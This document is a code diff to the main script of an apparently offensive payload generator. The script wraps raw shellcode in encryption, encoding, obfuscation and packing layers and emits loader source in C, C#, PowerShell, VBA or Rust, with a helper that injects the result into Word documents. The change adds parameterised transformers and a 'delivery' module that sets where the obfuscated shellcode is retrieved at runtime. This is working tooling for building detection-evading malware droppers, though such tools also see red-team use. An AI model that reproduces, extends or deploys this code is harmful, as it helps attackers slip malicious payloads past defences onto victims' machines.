@@ -13,13 +13,14 @@ from utils.inject import create_word_doc
 
 def main():
     parser = argparse.ArgumentParser()
-    parser.add_argument('-e', "--transformers", type=str, required=False, help='Transformers encrypt or encode the shellcode and is decrypted or decoded at runtime.')
+    parser.add_argument('-e', "--transformers", type=str, nargs='*', required=False, help='Transformers encrypt or encode the shellcode and is decrypted or decoded at runtime.')
     parser.add_argument('-s', "--shellcode", type=str, required=True, help='Specifies the raw binary shellcode file')
     parser.add_argument('-t', "--template", type=str, required=True, help='Template that the shellcode and deobfuscation code will be placed into.')
     parser.add_argument('-l', "--language", type=str, choices={"c","cs","ps1","vba", "rs"}, required=True, help='Language used to write and compile')
     parser.add_argument('-f', "--obfuscator", type=str, required=False, help='Obfuscators transform the transformed shellcode bytes into other formats, such as strings.')
     parser.add_argument('-b', "--preprocessors", type=str, required=False, help='Preprocessors modify the shellcode but are self decoding.')
     parser.add_argument('-a', "--postprocessors", type=str, required=False, help='Postprocessors obfuscate the resulting exe or script, e.g. packers')
+    parser.add_argument('-d', "--delivery", type=str, required=False, default="embedded", help='Delivery defines where the obfuscated shellcode is retrieved')
     parser.add_argument('-o', "--output", type=str, required=False, default="output", help='Output file name')
     args = parser.parse_args()
 
@@ -55,13 +56,19 @@ def main():
     shellcodeSize = len(shellcode)
 
     if args.transformers:
-        transformersList = args.transformers.split(',')
-        for transformersItem in transformersList:
+        for transformer in args.transformers:
+            split = str(transformer).split(',')
+            transformersItem = split[0]
+            arguments = {}
+            if (len(split) != 1):
+                for item in split[1:]:
+                    splitItems = item.split('=')
+                    arguments[splitItems[0]] = splitItems[1]
             transformersSpec = importlib.util.spec_from_file_location(transformersItem, f'{args.language}/transformers/{transformersItem}.py')
             transformersModule = importlib.util.module_from_spec(transformersSpec)
             sys.modules[transformersSpec.name] = transformersModule 
             transformersSpec.loader.exec_module(transformersModule)
-            transformersObject = getattr(transformersModule, transformersItem)()
+            transformersObject = getattr(transformersModule, transformersItem)(arguments)
             transformersFunction = getattr(transformersObject, 'encode')
             transformedShellcode = transformersFunction(shellcode)
             codeblocks += getattr(transformersObject, 'codeblock')()
@@ -96,13 +103,26 @@ def main():
     imports = getattr(templateObject, 'imports')() + imports
 
     # Rename obfuscated shellcode
-    if args.language == 'ps1':
-        transformers = transformers.format(shellcode='$obfuscated')
-    else:
-        transformers = transformers.format(shellcode='obfuscated')
+    #if args.language == 'ps1':
+    #    transformers = transformers.format(shellcode='$obfuscated')
+    #else:
+    #transformers = transformers.format(shellcode='obfuscated')
+
+    
+    if args.delivery:
+        deliverySpec = importlib.util.spec_from_file_location(args.delivery, f'{args.language}/delivery/{args.delivery}.py')
+        deliveryModule = importlib.util.module_from_spec(deliverySpec)
+        sys.modules[deliverySpec.name] = deliveryModule 
+        deliverySpec.loader.exec_module(deliveryModule)
+        deliveryObject = getattr(deliveryModule, args.delivery)(shellcode)
+        codeblocks += getattr(deliveryObject, 'codeblock')()
+        transformers = getattr(deliveryObject, 'transformer')(transformers)
+        imports += getattr(deliveryObject, 'imports')()
+        compilerOptions += getattr(deliveryObject, 'compilerOptions')()
+    
 
     # Place shellcode in correct format
-    shellcode = globals()[f'{type(shellcode).__name__}_to_{args.language}'](shellcode, 'obfuscated')
+    #shellcode = globals()[f'{type(shellcode).__name__}_to_{args.language}'](shellcode, 'obfuscated')
 
     # Remove duplicates while retaining order
     imports = '\n'.join(list(dict.fromkeys(imports)))
@@ -115,7 +135,7 @@ def main():
         f = codecs.open(f'{args.output}.{args.language}', 'w', 'utf-8-sig')
     else:
         f = open(f'{args.output}.{args.language}', 'w')
-    formattedCode = templateCode.format(imports=imports, shellcode=shellcode, codeblocks=codeblocks, transformers=transformers, shellcodeSize=shellcodeSize)
+    formattedCode = templateCode.format(imports=imports, shellcode='', codeblocks=codeblocks, transformers=transformers, shellcodeSize=shellcodeSize)
     f.write(formattedCode)
     f.close()
     print(f'Source code saved to {args.output}.{args.language}')
